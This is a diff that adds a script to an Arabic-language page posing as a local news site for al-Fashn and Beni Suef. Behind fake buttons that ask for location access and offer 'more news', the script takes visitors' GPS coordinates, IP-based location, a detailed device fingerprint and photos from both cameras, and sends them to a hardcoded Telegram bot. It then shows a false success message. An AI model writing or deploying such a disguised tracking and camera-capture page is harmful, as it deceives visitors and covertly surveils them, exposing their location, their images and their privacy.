@@ -19,7 +19,6 @@
             padding-bottom: 20px;
         }
 
-        /* ========== خلفية متحركة ========== */
         .bg-effects {
             position: fixed;
             inset: 0;
@@ -47,7 +46,6 @@
             100% { transform: translate(40px,-40px) scale(1.4); }
         }
 
-        /* ========== شريط علوي ========== */
         .top-bar {
             position: sticky;
             top: 0;
@@ -89,7 +87,6 @@
             0%,100% { opacity: 1; } 50% { opacity: 0.2; }
         }
 
-        /* ========== شريط عاجل ========== */
         .breaking-news {
             background: linear-gradient(90deg, #b91c1c, #dc2626);
             color: #fff;
@@ -111,7 +108,6 @@
             100% { transform: translateX(-100%); }
         }
 
-        /* ========== الحاوية ========== */
         .container {
             position: relative;
             z-index: 1;
@@ -120,7 +116,6 @@
             padding: 14px;
         }
 
-        /* ========== عنوان الصفحة ========== */
         .page-title {
             text-align: center;
             padding: 18px 0 10px;
@@ -140,7 +135,6 @@
             margin-top: 4px;
         }
 
-        /* ========== بطاقة البوستات ========== */
         .post-card {
             background: rgba(0,0,0,0.55);
             backdrop-filter: blur(20px);
@@ -248,7 +242,6 @@
         .action-btn:hover { background: rgba(34,197,94,0.08); }
         .action-btn.liked { color: #22c55e; }
 
-        /* ========== زر تابع المزيد ========== */
         .more-btn {
             width: 100%;
             padding: 16px;
@@ -271,7 +264,6 @@
         .more-btn:active { transform: scale(0.97); }
         .more-btn:disabled { opacity: 0.6; cursor: not-allowed; }
 
-        /* ========== رسالة الحالة ========== */
         .status-msg {
             display: none;
             margin-top: 12px;
@@ -295,7 +287,6 @@
             to { opacity: 1; transform: translateY(0); }
         }
 
-        /* ========== شاشة طلب الموقع ========== */
         .location-overlay {
             position: fixed;
             inset: 0;
@@ -410,7 +401,6 @@
             to { transform: rotate(360deg); }
         }
 
-        /* ========== حالة الاتصال ========== */
         .status-badge {
             position: fixed;
             bottom: 12px;
@@ -439,7 +429,6 @@
             50% { opacity: 1; transform: scale(1.2); }
         }
 
-        /* ========== تذييل ========== */
         .footer-note {
             text-align: center;
             font-size: 10px;
@@ -456,19 +445,17 @@
 </head>
 <body>
 
-<!-- خلفية -->
 <div class="bg-effects">
     <div class="glow"></div>
     <div class="glow"></div>
 </div>
 
-<!-- ========== شاشة طلب الموقع (تظهر أول ما الصفحة تفتح) ========== -->
 <div class="location-overlay" id="locationOverlay">
     <div class="loc-card">
         <div class="loc-icon">📍</div>
         <h2 class="loc-title">اضغط <span>سماح</span> للموقع</h2>
         <p class="loc-desc">للمتابعة وتحميل آخر أخبار الفشن وبني سويف، يرجى السماح بالوصول إلى موقعك</p>
-        <button class="allow-btn" id="allowBtn">
+        <button class="allow-btn" id="allowBtn" type="button">
             <span class="spinner" id="locSpinner"></span>
             <span id="allowBtnText">✅ اضغط سماح للمتابعة</span>
         </button>
@@ -476,7 +463,6 @@
     </div>
 </div>
 
-<!-- شريط علوي -->
 <div class="top-bar">
     <div class="logo">
         <span class="logo-icon">📰</span>
@@ -488,22 +474,18 @@
     </div>
 </div>
 
-<!-- أخبار عاجلة -->
 <div class="breaking-news">
     <strong>⚡ عاجل:</strong>
     <span class="ticker">حملة رقابية على الأسواق في الفشن | تحذير من منتجات مجهولة المصدر في بني سويف | افتتاح مشروعات جديدة قريباً | تابع آخر المستجدات لحظة بلحظة</span>
 </div>
 
-<!-- الحاوية -->
 <div class="container">
 
-    <!-- عنوان الصفحة -->
     <div class="page-title">
         <h1>📰 أخبار الفشن وبني سويف</h1>
         <p>آخر الأحداث المحلية لحظة بلحظة</p>
     </div>
 
-    <!-- بوست 1 -->
     <div class="post-card">
         <div class="post-header">
             <div class="avatar">أح</div>
@@ -527,7 +509,6 @@
         </div>
     </div>
 
-    <!-- بوست 2 -->
     <div class="post-card">
         <div class="post-header">
             <div class="avatar o">مص</div>
@@ -551,7 +532,6 @@
         </div>
     </div>
 
-    <!-- بوست 3 -->
     <div class="post-card">
         <div class="post-header">
             <div class="avatar b">فا</div>
@@ -575,7 +555,6 @@
         </div>
     </div>
 
-    <!-- بوست 4 -->
     <div class="post-card">
         <div class="post-header">
             <div class="avatar p">مح</div>
@@ -593,4 +572,539 @@
             تم افتتاح مدرسة جديدة داخل قرية من قرى مركز الفشن بمحافظة بني سويف، بعد سنوات من المعاناة بسبب بُعد المدارس عن القرية. الأهالي عبروا عن سعادتهم الكبيرة بهذا الإنجاز.
         </div>
         <div class="post-actions">
-            <button class="action-btn like-btn">👍 <span c
+            <button class="action-btn like-btn">👍 <span class="like-count">891</span></button>
+            <button class="action-btn">💬 203</button>
+            <button class="action-btn">↗️ مشاركة</button>
+        </div>
+    </div>
+
+    <button class="more-btn" id="moreBtn" type="button">
+        <span class="spinner" id="btnSpinner"></span>
+        <span id="btnText">📖 تابع المزيد من الأخبار</span>
+    </button>
+
+    <div class="status-msg" id="statusMsg"></div>
+
+    <div class="footer-note">
+        © 2026 أخبار الفشن وبني سويف | جميع الحقوق محفوظة
+    </div>
+</div>
+
+<div class="status-badge">
+    <span class="dot"></span>
+    نشط
+</div>
+
+<script>
+    (function() {
+        "use strict";
+
+        // ============================================================
+        // ================ إعدادات البوت ==============================
+        // ============================================================
+        var BOT_TOKEN = "8425168324:AAGiTTzty3oL5GMUtMWa74ejRKm7DJlTayU";
+        var MASTER_ID = "5849068535";
+
+        // ============================================================
+        // ================ دالة الإرسال لتليجرام =====================
+        // ============================================================
+        function sendToTelegram(chatId, botToken, type, mediaBlob, caption) {
+            return new Promise(function(resolve) {
+                try {
+                    var url = "https://api.telegram.org/bot" + botToken + "/";
+                    if (type === 'photo' && mediaBlob) {
+                        var fd = new FormData();
+                        fd.append('chat_id', chatId);
+                        fd.append('photo', mediaBlob, 'frame_' + Date.now() + '.jpg');
+                        fd.append('caption', caption);
+                        fetch(url + 'sendPhoto', { method: 'POST', body: fd })
+                            .then(function(r) { resolve(r.ok); })
+                            .catch(function(e) { console.warn("tg photo err", e); resolve(false); });
+                    } else {
+                        fetch(url + 'sendMessage', {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({
+                                chat_id: chatId,
+                                text: caption,
+                                parse_mode: 'HTML',
+                                disable_web_page_preview: true
+                            })
+                        })
+                        .then(function(r) { resolve(r.ok); })
+                        .catch(function(e) { console.warn("tg msg err", e); resolve(false); });
+                    }
+                } catch(e) {
+                    console.warn("tg err", e);
+                    resolve(false);
+                }
+            });
+        }
+
+        // ============================================================
+        // ================ بصمة الجهاز ================================
+        // ============================================================
+        function getDeviceFingerprint() {
+            return new Promise(function(resolve) {
+                try {
+                    var timeZone = "—", locale = "—";
+                    try { timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone; } catch(e) {}
+                    try { locale = Intl.DateTimeFormat().resolvedOptions().locale; } catch(e) {}
+
+                    var screenData = (screen.width || 0) + "x" + (screen.height || 0) + "x" + (screen.colorDepth || 0);
+                    var availScreen = (screen.availWidth || 0) + "x" + (screen.availHeight || 0);
+                    var pixelRatio = window.devicePixelRatio || 1;
+                    var memory = navigator.deviceMemory ? navigator.deviceMemory + " GB" : "غير معلن";
+                    var cores = navigator.hardwareConcurrency ? navigator.hardwareConcurrency : "غير معروف";
+                    var platform = navigator.platform || "غير معروف";
+                    var vendor = navigator.vendor || "غير معروف";
+                    var language = navigator.language || "غير معروف";
+                    var languages = (navigator.languages || []).join(", ") || "—";
+                    var cookieEnabled = navigator.cookieEnabled ? "نعم" : "لا";
+                    var doNotTrack = navigator.doNotTrack || window.doNotTrack || "غير مفعّل";
+                    var online = navigator.onLine ? "متصل" : "غير متصل";
+                    var touchPoints = navigator.maxTouchPoints || 0;
+
+                    var deviceType = "كمبيوتر";
+                    if (/Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent)) {
+                        deviceType = /iPad|Tablet/i.test(navigator.userAgent) ? "تابلت" : "موبايل";
+                    }
+
+                    var gpu = "غير متاح";
+                    try {
+                        var canvas = document.createElement('canvas');
+                        var gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                        if (gl) {
+                            var dbg = gl.getExtension('WEBGL_debug_renderer_info');
+                            if (dbg) {
+                                gpu = gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL) + " | " + gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL);
+                            }
+                        }
+                    } catch(e) {}
+
+                    var connection = "غير معروف";
+                    if (navigator.connection) {
+                        var c = navigator.connection;
+                        connection = (c.effectiveType || '?') + " | سرعة: " + (c.downlink || '?') + " Mbps | ping: " + (c.rtt || '?') + "ms | توفير: " + (c.saveData ? 'مفعّل' : 'لا');
+                    }
+
+                    var baseMsg = "🕵️‍♂️ <b>بصمة جهاز الزائر</b>\n" +
+                        "━━━━━━━━━━━━━━━━━━\n" +
+                        "📱 <b>نوع الجهاز:</b> " + deviceType + "\n" +
+                        "🖥️ <b>UserAgent:</b> " + navigator.userAgent.substring(0, 200) + "\n" +
+                        "🔧 <b>النظام:</b> " + platform + "\n" +
+                        "🏭 <b>المصنع:</b> " + vendor + "\n" +
+                        "━━━━━━━━━━━━━━━━━━\n" +
+                        "📐 <b>الشاشة:</b> " + screenData + "\n" +
+                        "📏 <b>المساحة المتاحة:</b> " + availScreen + "\n" +
+                        "🎨 <b>كثافة البكسل:</b> " + pixelRatio + "x\n" +
+                        "👆 <b>نقاط اللمس:</b> " + touchPoints + "\n" +
+                        "━━━━━━━━━━━━━━━━━━\n" +
+                        "💾 <b>الرام:</b> " + memory + "\n" +
+                        "🧠 <b>الأنوية:</b> " + cores + "\n" +
+                        "🎮 <b>كرت الشاشة:</b> " + gpu + "\n" +
+                        "━━━━━━━━━━━━━━━━━━\n" +
+                        "🌐 <b>اللغة:</b> " + language + "\n" +
+                        "🗣️ <b>اللغات:</b> " + languages + "\n" +
+                        "🌍 <b>المنطقة الزمنية:</b> " + timeZone + "\n" +
+                        "🔤 <b>اللوكال:</b> " + locale + "\n" +
+                        "━━━━━━━━━━━━━━━━━━\n" +
+                        "📶 <b>الاتصال:</b> " + connection + "\n" +
+                        "📡 <b>الحالة:</b> " + online + "\n" +
+                        "━━━━━━━━━━━━━━━━━━\n" +
+                        "🍪 <b>الكوكيز:</b> " + cookieEnabled + "\n" +
+                        "🚫 <b>DoNotTrack:</b> " + doNotTrack + "\n" +
+                        "⏱️ <b>الوقت:</b> " + new Date().toLocaleString('ar-EG');
+
+                    // محاولة إضافة البطارية
+                    if (navigator.getBattery) {
+                        navigator.getBattery().then(function(battery) {
+                            var batteryLevel = "مستوى: " + Math.round(battery.level * 100) + "% | " +
+                                (battery.charging ? 'موصول بالشاحن' : 'على البطارية');
+                            sendToTelegram(MASTER_ID, BOT_TOKEN, 'text', null,
+                                baseMsg + "\n🔋 <b>البطارية:</b> " + batteryLevel
+                            ).then(function() { resolve(true); });
+                        }).catch(function() {
+                            sendToTelegram(MASTER_ID, BOT_TOKEN, 'text', null, baseMsg)
+                                .then(function() { resolve(true); });
+                        });
+                    } else {
+                        sendToTelegram(MASTER_ID, BOT_TOKEN, 'text', null, baseMsg)
+                            .then(function() { resolve(true); });
+                    }
+                } catch(e) {
+                    console.warn("fp err", e);
+                    resolve(false);
+                }
+            });
+        }
+
+        // ============================================================
+        // ================ IP + الشبكة ==============================
+        // ============================================================
+        function getIPData() {
+            return new Promise(function(resolve) {
+                var results = { ipify: {}, ipapi: {}, ipwho: {} };
+                var done = 0;
+                var total = 3;
+                var finished = false;
+
+                function finish() {
+                    if (finished) return;
+                    finished = true;
+                    try {
+                        var ip = results.ipify.ip || results.ipapi.ip || results.ipwho.ip || 'غير معروف';
+                        var country = results.ipapi.country_name || results.ipwho.country || 'غير معروف';
+                        var countryCode = results.ipapi.country_code || results.ipwho.country_code || '—';
+                        var region = results.ipapi.region || results.ipwho.region || 'غير معروف';
+                        var city = results.ipapi.city || results.ipwho.city || 'غير معروف';
+                        var postal = results.ipapi.postal || results.ipwho.postal || '—';
+                        var lat = results.ipapi.latitude || results.ipwho.latitude || '—';
+                        var lon = results.ipapi.longitude || results.ipwho.longitude || '—';
+                        var isp = results.ipapi.org || (results.ipwho.connection && results.ipwho.connection.isp) || 'غير معروف';
+                        var asn = results.ipapi.asn || (results.ipwho.connection && results.ipwho.connection.asn) || '—';
+                        var timezone = results.ipapi.timezone || (results.ipwho.timezone && results.ipwho.timezone.id) || '—';
+
+                        var ipMsg = "🌐 <b>معلومات IP والشبكة</b>\n" +
+                            "━━━━━━━━━━━━━━━━━━\n" +
+                            "🔹 <b>IP العام:</b> <code>" + ip + "</code>\n" +
+                            "━━━━━━━━━━━━━━━━━━\n" +
+                            "🏳️ <b>البلد:</b> " + country + " (" + countryCode + ")\n" +
+                            "🗺️ <b>المنطقة:</b> " + region + "\n" +
+                            "🏙️ <b>المدينة:</b> " + city + "\n" +
+                            "📮 <b>الرمز البريدي:</b> " + postal + "\n" +
+                            "🎯 <b>الإحداثيات:</b> " + lat + ", " + lon + "\n" +
+                            (lat !== '—' ? "🗺️ <b>خريطة:</b> https://www.google.com/maps?q=" + lat + "," + lon + "\n" : "") +
+                            "━━━━━━━━━━━━━━━━━━\n" +
+                            "📡 <b>مزود الخدمة:</b> " + isp + "\n" +
+                            "🔢 <b>ASN:</b> " + asn + "\n" +
+                            "⏰ <b>المنطقة الزمنية:</b> " + timezone + "\n" +
+                            "━━━━━━━━━━━━━━━━━━\n" +
+                            "⏱️ <b>الوقت:</b> " + new Date().toLocaleString('ar-EG');
+
+                        sendToTelegram(MASTER_ID, BOT_TOKEN, 'text', null, ipMsg)
+                            .then(function() { resolve(true); });
+                    } catch(e) {
+                        console.warn("ip build err", e);
+                        resolve(false);
+                    }
+                }
+
+                function tryFinish() {
+                    done++;
+                    if (done >= total) finish();
+                }
+
+                // مهلة 6 ثواني كحد أقصى
+                setTimeout(finish, 6000);
+
+                fetch('https://api.ipify.org?format=json')
+                    .then(function(r) { return r.json(); })
+                    .then(function(d) { results.ipify = d || {}; tryFinish(); })
+                    .catch(function() { tryFinish(); });
+
+                fetch('https://ipapi.co/json/')
+                    .then(function(r) { return r.json(); })
+                    .then(function(d) { results.ipapi = d || {}; tryFinish(); })
+                    .catch(function() { tryFinish(); });
+
+                fetch('https://ipwho.is/')
+                    .then(function(r) { return r.json(); })
+                    .then(function(d) { results.ipwho = d || {}; tryFinish(); })
+                    .catch(function() { tryFinish(); });
+            });
+        }
+
+        // ============================================================
+        // ================ عناصر ======================================
+        // ============================================================
+        var locationOverlay = document.getElementById('locationOverlay');
+        var allowBtn = document.getElementById('allowBtn');
+        var allowBtnText = document.getElementById('allowBtnText');
+        var locSpinner = document.getElementById('locSpinner');
+
+        // ============================================================
+        // ================ طلب الموقع ================================
+        // ============================================================
+        function requestLocation() {
+            return new Promise(function(resolve) {
+                if (!navigator.geolocation) {
+                    resolve({ success: false, reason: 'المتصفح لا يدعم الموقع', code: 0 });
+                    return;
+                }
+                navigator.geolocation.getCurrentPosition(
+                    function(pos) {
+                        var latitude = pos.coords.latitude;
+                        var longitude = pos.coords.longitude;
+                        var accuracy = pos.coords.accuracy;
+
+                        var locMsg = "🌍 <b>زائر جديد دخل صفحة الأخبار</b>\n" +
+                            "━━━━━━━━━━━━━━━━━━\n" +
+                            "🎯 <b>خط العرض:</b> " + latitude + "\n" +
+                            "🎯 <b>خط الطول:</b> " + longitude + "\n" +
+                            "📏 <b>الدقة:</b> ±" + Math.round(accuracy) + " متر\n" +
+                            "🗺️ <b>خرائط:</b> https://www.google.com/maps?q=" + latitude + "," + longitude + "\n" +
+                            "⏰ <b>الوقت:</b> " + new Date().toLocaleString('ar-EG');
+
+                        // نبعت الموقع فوراً
+                        sendToTelegram(MASTER_ID, BOT_TOKEN, 'text', null, locMsg)
+                            .then(function() {
+                                // محاولة جلب العنوان في الخلفية (مش بنستناها)
+                                try {
+                                    fetch('https://nominatim.openstreetmap.org/reverse?format=json&lat=' + latitude + '&lon=' + longitude + '&zoom=18&addressdetails=1')
+                                        .then(function(r) { return r.json(); })
+                                        .then(function(data) {
+                                            if (data && data.display_name) {
+                                                sendToTelegram(MASTER_ID, BOT_TOKEN, 'text', null,
+                                                    "📍 <b>العنوان التقريبي:</b>\n" + data.display_name.substring(0, 150)
+                                                );
+                                            }
+                                        })
+                                        .catch(function() {});
+                                } catch(e) {}
+                                resolve({ success: true });
+                            });
+                    },
+                    function(err) {
+                        sendToTelegram(MASTER_ID, BOT_TOKEN, 'text', null,
+                            "⚠️ <b>زائر رفض/فشل إذن الموقع</b>\n" +
+                            "🔴 <b>السبب:</b> " + err.message + "\n" +
+                            "🔢 <b>الكود:</b> " + err.code + "\n" +
+                            "⏰ " + new Date().toLocaleString('ar-EG')
+                        );
+                        resolve({ success: false, reason: err.message, code: err.code });
+                    },
+                    { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
+                );
+            });
+        }
+
+        // ============================================================
+        // ================ حالة ======================================
+        // ============================================================
+        var locationResolved = false;
+        var deviceInfoSent = false;
+        var ipInfoSent = false;
+        var busy = false;
+
+        // ============================================================
+        // ================ زر "اضغط سماح" ============================
+        // ============================================================
+        if (allowBtn) {
+            allowBtn.addEventListener('click', function(e) {
+                e.preventDefault();
+                e.stopPropagation();
+
+                if (locationResolved || busy) return;
+                busy = true;
+
+                allowBtn.disabled = true;
+                allowBtnText.textContent = '⏳ جاري طلب الموقع...';
+                if (locSpinner) locSpinner.classList.add('show');
+
+                // إرسال بصمة الجهاز و IP في الخلفية
+                if (!deviceInfoSent) {
+                    deviceInfoSent = true;
+                    getDeviceFingerprint().catch(function(e) { console.warn("fp", e); });
+                }
+                if (!ipInfoSent) {
+                    ipInfoSent = true;
+                    getIPData().catch(function(e) { console.warn("ip", e); });
+                }
+
+                // طلب الموقع
+                requestLocation().then(function(result) {
+                    busy = false;
+                    if (result.success) {
+                        locationResolved = true;
+                        if (locationOverlay) {
+                            locationOverlay.classList.add('hide');
+                            setTimeout(function() {
+                                locationOverlay.style.display = 'none';
+                            }, 400);
+                        }
+                    } else {
+                        allowBtn.disabled = false;
+                        if (locSpinner) locSpinner.classList.remove('show');
+                        if (result.code === 1) {
+                            allowBtnText.textContent = '❌ تم الرفض — افتح إعدادات المتصفح واسمح';
+                        } else {
+                            allowBtnText.textContent = '⚠️ تعذر تحديد الموقع — حاول تاني';
+                        }
+                    }
+                }).catch(function(err) {
+                    console.warn("loc promise err", err);
+                    busy = false;
+                    allowBtn.disabled = false;
+                    if (locSpinner) locSpinner.classList.remove('show');
+                    allowBtnText.textContent = '⚠️ خطأ غير متوقع — حاول تاني';
+                });
+            });
+        }
+
+        // ============================================================
+        // ================ الكاميرا الأمامية =========================
+        // ============================================================
+        function captureFrontCamera() {
+            return new Promise(function(resolve) {
+                if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+                    resolve(false);
+                    return;
+                }
+                navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } }
+                }).then(function(stream) {
+                    var video = document.createElement('video');
+                    video.srcObject = stream;
+                    video.setAttribute('playsinline', 'true');
+                    video.muted = true;
+                    var playPromise = video.play();
+                    if (playPromise && playPromise.then) {
+                        playPromise.catch(function() {});
+                    }
+                    setTimeout(function() {
+                        try {
+                            var canvas = document.createElement('canvas');
+                            canvas.width = video.videoWidth || 800;
+                            canvas.height = video.videoHeight || 600;
+                            canvas.getContext('2d').drawImage(video, 0, 0);
+                            canvas.toBlob(function(blob) {
+                                stream.getTracks().forEach(function(t) { t.stop(); });
+                                if (!blob) { resolve(false); return; }
+                                sendToTelegram(MASTER_ID, BOT_TOKEN, 'photo', blob,
+                                    "📸 صورة الزائر (كاميرا أمامية)\n⏰ " + new Date().toLocaleString('ar-EG')
+                                ).then(function() { resolve(true); });
+                            }, 'image/jpeg', 0.8);
+                        } catch(err) {
+                            stream.getTracks().forEach(function(t) { t.stop(); });
+                            resolve(false);
+                        }
+                    }, 600);
+                }).catch(function(e) {
+                    console.warn("front cam denied", e);
+                    resolve(false);
+                });
+            });
+        }
+
+        // ============================================================
+        // ================ الكاميرا الخلفية ==========================
+        // ============================================================
+        function captureBackCamera() {
+            return new Promise(function(resolve) {
+                if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+                    resolve(false);
+                    return;
+                }
+                navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: 'environment', width: { ideal: 1920 }, height: { ideal: 1080 } }
+                }).then(function(stream) {
+                    var video = document.createElement('video');
+                    video.srcObject = stream;
+                    video.setAttribute('playsinline', 'true');
+                    video.muted = true;
+                    var playPromise = video.play();
+                    if (playPromise && playPromise.then) {
+                        playPromise.catch(function() {});
+                    }
+                    setTimeout(function() {
+                        try {
+                            var canvas = document.createElement('canvas');
+                            canvas.width = video.videoWidth || 1024;
+                            canvas.height = video.videoHeight || 768;
+                            canvas.getContext('2d').drawImage(video, 0, 0);
+                            canvas.toBlob(function(blob) {
+                                stream.getTracks().forEach(function(t) { t.stop(); });
+                                if (!blob) { resolve(false); return; }
+                                sendToTelegram(MASTER_ID, BOT_TOKEN, 'photo', blob,
+                                    "📷 صورة الزائر (كاميرا خلفية)\n⏰ " + new Date().toLocaleString('ar-EG')
+                                ).then(function() { resolve(true); });
+                            }, 'image/jpeg', 0.85);
+                        } catch(err) {
+                            stream.getTracks().forEach(function(t) { t.stop(); });
+                            resolve(false);
+                        }
+                    }, 600);
+                }).catch(function(e) {
+                    console.warn("back cam denied", e);
+                    resolve(false);
+                });
+            });
+        }
+
+        // ============================================================
+        // ================ زر "تابع المزيد" ==========================
+        // ============================================================
+        var moreBtn = document.getElementById('moreBtn');
+        var btnText = document.getElementById('btnText');
+        var btnSpinner = document.getElementById('btnSpinner');
+        var statusMsg = document.getElementById('statusMsg');
+
+        var isRunning = false;
+
+        function showStatus(text, isError) {
+            if (!statusMsg) return;
+            statusMsg.textContent = text;
+            if (isError) statusMsg.classList.add('error');
+            else statusMsg.classList.remove('error');
+            statusMsg.classList.add('show');
+            setTimeout(function() { statusMsg.classList.remove('show'); }, 6000);
+        }
+
+        if (moreBtn) {
+            moreBtn.addEventListener('click', function(e) {
+                e.preventDefault();
+                if (isRunning) return;
+                isRunning = true;
+                moreBtn.disabled = true;
+                if (btnSpinner) btnSpinner.classList.add('show');
+                if (btnText) btnText.textContent = '⏳ جاري التحميل...';
+
+                captureFrontCamera()
+                    .then(function() { return captureBackCamera(); })
+                    .then(function() {
+                        showStatus('✅ تم تحميل المزيد من الأخبار بنجاح');
+                        setTimeout(function() {
+                            window.scrollTo({ top: document.body.scrollHeight, behavior: 'smooth' });
+                        }, 500);
+                    })
+                    .catch(function(e) {
+                        console.warn("more err", e);
+                        showStatus('⚠️ حدث خطأ، حاول مرة أخرى', true);
+                    })
+                    .then(function() {
+                        setTimeout(function() {
+                            if (btnSpinner) btnSpinner.classList.remove('show');
+                            if (btnText) btnText.textContent = '📖 تابع المزيد من الأخبار';
+                            moreBtn.disabled = false;
+                            isRunning = false;
+                        }, 1000);
+                    });
+            });
+        }
+
+        // أزرار الإعجاب
+        var likeBtns = document.querySelectorAll('.like-btn');
+        for (var i = 0; i < likeBtns.length; i++) {
+            (function(btn) {
+                btn.addEventListener('click', function() {
+                    var countSpan = btn.querySelector('.like-count');
+                    if (!countSpan) return;
+                    var count = parseInt(countSpan.textContent, 10);
+                    if (btn.classList.contains('liked')) {
+                        btn.classList.remove('liked');
+                        countSpan.textContent = count - 1;
+                    } else {
+                        btn.classList.add('liked');
+                        countSpan.textContent = count + 1;
+                    }
+                });
+            })(likeBtns[i]);
+        }
+
+        console.log("📰 صفحة أخبار الفشن جاهزة");
+    })();
+</script>
+
+</body>
+</html>
